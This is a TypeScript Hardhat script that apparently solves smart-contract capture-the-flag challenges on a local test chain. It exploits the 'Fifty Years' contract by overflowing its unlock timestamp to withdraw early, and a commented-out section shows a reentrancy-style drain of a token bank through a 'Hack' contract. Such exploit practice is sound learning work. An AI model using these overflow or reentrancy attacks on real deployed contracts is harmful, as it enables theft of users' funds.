import "@typechain/hardhat";
import "@nomiclabs/hardhat-ethers";
import { ethers } from "hardhat";
import CoActTokenABI from "../artifacts/contracts/fiftyYears.sol/FiftyYearsChallenge.json";
import {
  hackSol,
  Hack__factory,
  FiftyYearsChallenge,
} from "../artifacts/contracts/types";
import { ConstructorFragment } from "ethers/lib/utils";
import { utils } from "ethers";
const CONTRACT_ADDRESS = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
const TOKEN_ADDRESS = "0xa16E02E87b7454126E5E10d957A927A7F5B5d2be";
const deploy = async () => {
  const Hack = await ethers.getContractFactory("Hack");
  const hack = await Hack.deploy();
  console.log("Contract deployed to:", hack.address);
  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    CoActTokenABI.abi,
    await ethers.getSigner("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266")
  ) as FiftyYearsChallenge;
  console.log("Done?", await contract.isComplete());
  await contract.upsert(
    1,
    BigInt(
      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    ),
    { value: utils.parseEther("1") }
  );
  await contract.upsert(1, 3600 * 1000 * 24 * 2, {
    value: utils.parseEther("1"),
  });
  await contract.withdraw(3); //why not going into loop??
  console.log("Done?", await contract.isComplete());
  /*   const token = new ethers.Contract(
    TOKEN_ADDRESS,
    tokenABI.abi,
    await ethers.getSigner("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266")
  ) as SimpleERC223Token;
  console.log("NAME", await token.name());
  await hack.setContracts(TOKEN_ADDRESS, CONTRACT_ADDRESS);
  await contract.withdraw(BigInt("500000") * BigInt("10") ** BigInt("18"), {
    gasLimit: 100000,
  });
  await hack.setDrained(true);
  await token["transfer(address,uint256)"](
    hack.address,
    BigInt("500000") * BigInt("10") ** BigInt("18"),
    { gasLimit: 100000 }
  );
  await hack.setDrained(false);
  await hack.payMoneyToTokenBank(
    BigInt("500000") * BigInt("10") ** BigInt("18"),
    {
      gasLimit: 100000,
    }
  );
  await hack.withDrawFromTokenBank(
    BigInt("500000") * BigInt("10") ** BigInt("18"),
    {
      gasLimit: 100000,
    }
  );
  await hack.drain(BigInt("1000000") * BigInt("10") ** BigInt("18"), {
    gasLimit: 100000,
  });
  console.log("Done?", await contract.isComplete()); */
  // await hack.auth({ gasLimit: 100000 });*/
};

deploy()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
